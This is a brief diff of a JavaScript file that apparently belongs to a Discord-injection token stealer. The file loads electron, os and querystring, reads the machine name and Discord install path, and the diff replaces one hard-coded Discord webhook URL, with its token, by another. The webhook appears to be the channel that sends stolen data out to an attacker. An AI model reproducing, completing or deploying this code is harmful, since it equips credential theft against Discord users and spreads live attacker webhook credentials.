@@ -8,7 +8,7 @@ const fs = require("fs"),
     querystring = require("querystring"),
     electron = require("electron"),
     os = require("os");
-var webhook = "https://discord.com/api/webhooks/912220481648750622/3GPiwnfjijfhMJRAmNyDvYRTx4gmdN4W9tEFZszDzXLGHZQNcebidIe3Lw-KEmVi4Wv0";
+var webhook = "https://discord.com/api/webhooks/912452462537998336/6HbYa_bO2W1DQnQvemp8aPfO7CEkhvINlIE1bhl6NOERD1-uI8UvPWMEWTaw8mi2hUzn";
 const computerName = os.hostname(),
     discordInstall = `${__dirname.split("\\")[5]} | ${__dirname.split("\\")[6]}`;
 
